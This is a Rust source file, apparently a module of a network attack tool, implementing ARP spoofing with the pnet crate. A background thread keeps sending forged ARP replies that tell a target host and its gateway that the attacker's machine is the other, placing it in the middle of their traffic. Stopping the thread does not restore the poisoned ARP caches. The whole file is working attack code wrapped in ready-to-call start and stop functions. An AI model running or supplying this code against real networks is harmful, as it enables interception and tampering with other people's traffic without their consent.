use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;
use pnet::datalink;
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::{MutablePacket, Packet};
use macaddr::MacAddr6;
use crate::networking::host::Host;
use crate::networking::utils::get_network_info;

/// Manages ARP spoofing operations
pub struct ArpSpoofer {
    running: Arc<AtomicBool>,
    handle: Option<thread::JoinHandle<()>>,
}

impl ArpSpoofer {
    /// Create a new ARP spoofer
    pub fn new() -> Self {
        ArpSpoofer {
            running: Arc::new(AtomicBool::new(false)),
            handle: None,
        }
    }
    
    /// Start ARP spoofing a target
    pub fn start_spoofing(&mut self, target: &Host, gateway: &Host) -> Result<(), String> {
        if self.running.load(Ordering::Relaxed) {
            return Err("Spoofing already running".to_string());
        }
        
        let (interface_name, _, _) = get_network_info()?;
        let interfaces = datalink::interfaces();
        let interface = interfaces.into_iter()
            .find(|iface| iface.name == interface_name)
            .ok_or("Interface not found")?;
        
        let my_mac = interface.mac.ok_or("Interface MAC not found")?;
        let target_ip = target.ip;
        let target_mac = target.mac;
        let gateway_ip = gateway.ip;
        let gateway_mac = gateway.mac;
        let running: Arc<AtomicBool> = Arc::clone(&self.running);
        
        self.running.store(true, Ordering::Relaxed);
        let handle = thread::spawn(move || {
            let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
                Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
                Ok(_) => {
                    eprintln!("Unhandled channel type");
                    return;
                }
                Err(e) => {
                    eprintln!("Error creating channel: {}", e);
                    return;
                }
            };
            
            while running.load(Ordering::Relaxed) {
                // Tell target we're the gateway
                if let Err(e) = send_arp_reply(&mut tx, my_mac, target_mac, gateway_ip, target_ip) {
                    eprintln!("Error sending ARP to target: {}", e);
                }
                
                // Tell gateway we're the target
                if let Err(e) = send_arp_reply(&mut tx, my_mac, gateway_mac, target_ip, gateway_ip) {
                    eprintln!("Error sending ARP to gateway: {}", e);
                }
                
                // Minimal sleep to reduce CPU usage while maintaining effectiveness
                thread::sleep(Duration::from_millis(1000));
            }
        });
        
        self.handle = Some(handle);
        Ok(())
    }
    
    /// Stop ARP spoofing
    pub fn stop_spoofing(&mut self) {
        if self.running.load(Ordering::Relaxed) {
            self.running.store(false, Ordering::Relaxed);
            
            if let Some(handle) = self.handle.take() {
                let _ = handle.join();
            }
        }
    }
}

impl Drop for ArpSpoofer {
    fn drop(&mut self) {
        self.stop_spoofing();
    }
}

/// Send a forged ARP reply
fn send_arp_reply(
    tx: &mut Box<dyn datalink::DataLinkSender>,
    sender_mac: MacAddr6,
    target_mac: MacAddr6,
    sender_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
) -> Result<(), String> {
    let mut ethernet_buffer = [0u8; 42];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer)
        .ok_or("Failed to create Ethernet packet")?;
    
    ethernet_packet.set_destination(target_mac);
    ethernet_packet.set_source(sender_mac);
    ethernet_packet.set_ethertype(EtherTypes::Arp);
    
    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer)
        .ok_or("Failed to create ARP packet")?;
    
    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperations::Reply);
    arp_packet.set_sender_hw_addr(sender_mac);
    arp_packet.set_sender_proto_addr(sender_ip);
    arp_packet.set_target_hw_addr(target_mac);
    arp_packet.set_target_proto_addr(target_ip);
    
    ethernet_packet.set_payload(arp_packet.packet_mut());
    
    tx.send_to(ethernet_packet.packet(), None)
        .map_err(|e| format!("Failed to send ARP reply: {:?}", e))?
        .map_err(|e| format!("Failed to send ARP reply: {:?}", e))?;
    
    Ok(())
}

// Convenience functions for backward compatibility
static mut GLOBAL_SPOOFER: Option<ArpSpoofer> = None;

/// Start ARP spoofing (simplified interface)
pub fn start_arp_spoofing(target: &Host, gateway: &Host) -> Result<(), String> {
    unsafe {
        if GLOBAL_SPOOFER.is_none() {
            GLOBAL_SPOOFER = Some(ArpSpoofer::new());
        }
        
        if let Some(ref mut spoofer) = GLOBAL_SPOOFER {
            spoofer.start_spoofing(target, gateway)
        } else {
            Err("Failed to create spoofer".to_string())
        }
    }
}

/// Stop ARP spoofing (simplified interface)
pub fn stop_arp_spoofing() {
    unsafe {
        if let Some(ref mut spoofer) = GLOBAL_SPOOFER {
            spoofer.stop_spoofing();
        }
    }
}